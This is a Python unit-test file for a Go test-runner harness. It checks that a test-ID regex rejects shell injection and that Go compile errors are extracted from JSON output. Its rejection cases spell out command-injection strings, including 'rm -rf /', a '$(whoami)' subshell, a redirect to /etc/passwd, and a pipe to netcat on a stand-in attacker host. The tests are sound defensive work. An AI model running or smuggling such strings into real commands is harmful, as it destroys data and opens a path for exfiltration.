"""Unit tests for commit0.harness.run_go_tests.

Focuses on the pure functions:
- _TEST_IDS_RE — the shell-metachar guard for test_ids (mirrors run_rust_tests).
- _extract_build_errors — extracts Go compile errors from JSON output.
- main() input validation for unsafe test_ids.

The full main() dataset/docker execution path is not exercised (would require a
running Docker daemon + real git repo) — those paths are covered by the
integration harness. This file guards the pure logic.
"""

from __future__ import annotations

import json

import pytest


from commit0.harness.run_go_tests import (
    _TEST_IDS_RE,
    _extract_build_errors,
)


class TestTestIdsRegex:
    @pytest.mark.parametrize(
        "valid",
        [
            "",
            "TestFoo",
            "pkg/TestFoo",
            "example.com/pkg/TestFoo",
            "TestA TestB",
            "TestA\tTestB",
            "pkg-with-dash/TestFoo",
            "pkg_with_underscore/TestFoo",
            "example.com/pkg/v2/TestFoo",
        ],
    )
    def test_accepts_safe_ids(self, valid: str) -> None:
        """Test that _TEST_IDS_RE accepts legitimate test-id shapes."""
        assert _TEST_IDS_RE.match(valid)

    @pytest.mark.parametrize(
        "unsafe",
        [
            "TestFoo; rm -rf /",  # command chain
            "TestFoo\nrm -rf /",  # newline injection
            "TestFoo && echo",  # ampersand
            "TestFoo`id`",  # backtick
            "TestFoo$(whoami)",  # subshell
            "TestFoo > /etc/passwd",  # redirect
            "TestFoo | nc attacker 4444",  # pipe (bare | is NOT in whitelist)
        ],
    )
    def test_rejects_shell_metachars(self, unsafe: str) -> None:
        """Test that shell-metachar strings are rejected (would inject into logs)."""
        assert not _TEST_IDS_RE.match(unsafe)

    def test_horizontal_whitespace_only(self) -> None:
        """Test that ONLY space and tab are permitted whitespace (not newline)."""
        assert _TEST_IDS_RE.match("Test\tFoo Bar")
        assert not _TEST_IDS_RE.match("Test\nFoo")


class TestExtractBuildErrors:
    def test_extracts_syntax_error(self) -> None:
        """Test that 'syntax error' output is captured."""
        events = [
            {"Action": "output", "Package": "p", "Output": "./main.go:5: syntax error"},
        ]
        raw = "\n".join(json.dumps(e) for e in events)
        result = _extract_build_errors(raw)
        assert "syntax error" in result
        assert "main.go" in result

    def test_extracts_undefined(self) -> None:
        """Test that 'undefined:' output is captured."""
        events = [
            {"Action": "output", "Package": "p", "Output": "./x.go:10: undefined: Foo"},
        ]
        raw = "\n".join(json.dumps(e) for e in events)
        result = _extract_build_errors(raw)
        assert "undefined: Foo" in result

    def test_ignores_pass_output(self) -> None:
        """Test that clean test progress output is NOT flagged as a build error."""
        events = [
            {"Action": "run", "Package": "p", "Test": "TestA"},
            {"Action": "pass", "Package": "p", "Test": "TestA", "Elapsed": 0.01},
        ]
        raw = "\n".join(json.dumps(e) for e in events)
        # Only Action=output events can carry errors; pass events yield nothing.
        assert _extract_build_errors(raw) == ""

    def test_extracts_redeclared(self) -> None:
        """Test that 'redeclared' output is captured."""
        events = [
            {"Action": "output", "Package": "p", "Output": "./a.go:3: Foo redeclared in this block"},
        ]
        raw = "\n".join(json.dumps(e) for e in events)
        assert "redeclared" in _extract_build_errors(raw)

    def test_extracts_imported_and_not_used(self) -> None:
        """Test that 'imported and not used' output is captured."""
        events = [
            {"Action": "output", "Package": "p", "Output": '"fmt" imported and not used'},
        ]
        raw = "\n".join(json.dumps(e) for e in events)
        assert "imported and not used" in _extract_build_errors(raw)

    def test_ignores_malformed_json(self) -> None:
        """Test that non-JSON lines are silently skipped."""
        raw = "not-json-line\n" + json.dumps(
            {"Action": "output", "Package": "p", "Output": "./m.go:1: syntax error"}
        )
        assert "syntax error" in _extract_build_errors(raw)

    def test_truncates_long_output(self) -> None:
        """Test that output over max_length is truncated with a marker."""
        events = []
        for i in range(200):
            events.append(
                {
                    "Action": "output",
                    "Package": "p",
                    "Output": f"./file{i}.go:1: syntax error at line {i}",
                }
            )
        raw = "\n".join(json.dumps(e) for e in events)
        result = _extract_build_errors(raw, max_length=200)
        assert len(result) <= 200 + len("\n... (truncated)")
        assert "truncated" in result

    def test_empty_input_returns_empty(self) -> None:
        """Test that empty input returns empty string."""
        assert _extract_build_errors("") == ""


class TestMainInputValidation:
    def test_unsafe_test_ids_raise_value_error(self) -> None:
        """Test that main() rejects test_ids containing shell metachars (fail fast)."""
        from commit0.harness.run_go_tests import main

        with pytest.raises(ValueError, match="Unsafe characters in test_ids"):
            main(
                dataset_name="dummy",
                dataset_split="test",
                base_dir="/tmp",
                repo_or_repo_dir="/tmp/repo",
                branch="main",
                test_ids="TestFoo; rm -rf /",
                backend="LOCAL",
                timeout=60,
                num_cpus=1,
                rebuild_image=False,
                verbose=0,
            )
